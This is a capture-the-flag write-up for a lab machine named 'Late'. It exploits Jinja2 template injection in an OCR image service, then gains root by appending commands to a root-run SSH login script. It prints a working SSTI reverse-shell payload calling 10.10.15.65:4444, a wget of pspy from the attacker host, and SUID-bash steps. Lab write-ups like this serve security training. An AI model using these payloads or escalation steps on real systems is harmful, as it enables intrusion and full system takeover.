Port 80 hosts "Late" — a static site with a link to images.late.htb, a Flask-based image-to-text OCR service. Add both to /etc/hosts.

OCR Service

The OCR service at http://images.late.htb accepts image uploads, extracts text using OCR, and returns the result. The "with Flask" subtitle tells us the backend is Python/Flask — which uses Jinja2 templates.

Phase 1

Initial Access — SSTI via OCR

Why OCR + Jinja2 = SSTI The OCR service extracts text from images, then passes that text through a Jinja2 template to render the result page. If the extracted text contains Jinja2 syntax like {{ }}, the template engine evaluates it as code rather than displaying it as plain text. By creating an image containing {{7*7}} as text, the OCR extracts it, Jinja2 evaluates it, and the response shows 49.

Confirm SSTI

Create an image containing {{7*7}} as text (use a simple text editor, take a screenshot, or use ImageMagick):

# Create test image with ImageMagick
$ convert -size 400x100 xc:white -font Courier -pointsize 40 \
    -fill black -annotate +10+60 '{{7*7}}' test.png

Upload to the OCR service → response contains:

<p>49</p>

SSTI → Reverse Shell

Create an image containing a Jinja2 reverse shell payload. The OCR needs to read the text cleanly, so use a large, clear monospace font:

# Create image with reverse shell SSTI payload
$ convert -size 800x100 xc:white -font Courier -pointsize 28 \
    -fill black -annotate +10+60 \
    '{{request.application.__globals__.__builtins__.__import__("os").popen("bash -c \"bash -i >& /dev/tcp/10.10.15.65/4444 0>&1\"").read()}}' \
    shell.png
OCR is finicky The payload must be OCR-readable. Use a clean monospace font at 28pt+ size. Avoid curly braces getting misread — if OCR outputs { { instead of {{, the SSTI fails. You may need several attempts with different font sizes and styles. Alternatively, create the text in a text editor and screenshot it.

Phase 2

Privilege Escalation — ssh-alert.sh Hijack

Process Monitoring

# Upload and run pspy to find cron jobs
svc_acc@late:~$ wget http://10.10.14.15:8888/pspy64 -O /tmp/pspy64
svc_acc@late:~$ chmod +x /tmp/pspy64
svc_acc@late:~$ /tmp/pspy64

CMD: UID=0 | /usr/local/sbin/ssh-alert.sh

A root cron job runs /usr/local/sbin/ssh-alert.sh every time someone logs in via SSH. Check ownership:

svc_acc@late:~$ ls -la /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 Aug  5 19:49 /usr/local/sbin/ssh-alert.sh
Writable script run by root The script is owned by svc_acc — we have write permission. Since root executes it on every SSH login, appending commands to the script gives us root code execution. We just need to trigger an SSH login afterward.

Method 1: SUID Bash

# Append SUID bash creation to the script
svc_acc@late:~$ echo -e "cp /bin/bash /tmp/.0xdf\nchmod 4755 /tmp/.0xdf" \
    >> /usr/local/sbin/ssh-alert.sh

# Create SSH key to trigger login
svc_acc@late:~$ mkdir -p /home/svc_acc/.ssh
svc_acc@late:~$ ssh-keygen -t ed25519 -f /home/svc_acc/.ssh/id_ed25519 -N ""
svc_acc@late:~$ cp /home/svc_acc/.ssh/id_ed25519.pub /home/svc_acc/.ssh/authorized_keys
svc_acc@late:~$ chmod 700 /home/svc_acc/.ssh
svc_acc@late:~$ chmod 600 /home/svc_acc/.ssh/authorized_keys

# Get the private key to attacker machine
svc_acc@late:~$ cat /home/svc_acc/.ssh/id_ed25519

# From attacker: SSH login triggers the script as root
$ ssh -i id_ed25519 svc_acc@late.htb

# SUID bash should now exist
svc_acc@late:~$ /tmp/.0xdf -p
root@late:~#

Method 2: Direct Root Flag Read

# Simpler: just copy the root flag
svc_acc@late:~$ echo 'cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt' \
    >> /usr/local/sbin/ssh-alert.sh

# Trigger via SSH login
$ ssh -i id_ed25519 svc_acc@late.htb

svc_acc@late:~$ cat /tmp/root.txt
331cba44fb9cef32b5c554aeff3e53fa
Appendix

Key Takeaways

OCR services can be SSTI vectors.

If OCR-extracted text is passed through a template engine, the text becomes code. Creating images with template syntax ({{7*7}}) is an unconventional but effective injection method.

Font and size matter for OCR attacks.

OCR must accurately read the payload for the attack to work. Use large, clear monospace fonts. Test with {{7*7}} first before attempting complex payloads.

Scripts owned by low-privilege users but executed by root are instant wins.

Always check ownership of scripts in /usr/local/sbin/, /opt/, and cron directories. If you own a script that root runs, you own the box.

SSH login triggers can be exploited.

PAM hooks, .bashrc, and login alert scripts run on SSH connection. After modifying such a script, trigger it by SSH-ing in with a key you created.

pspy reveals hidden cron jobs.

Not all scheduled tasks appear in crontab -l. Process monitoring with pspy catches jobs run by other users, including root.
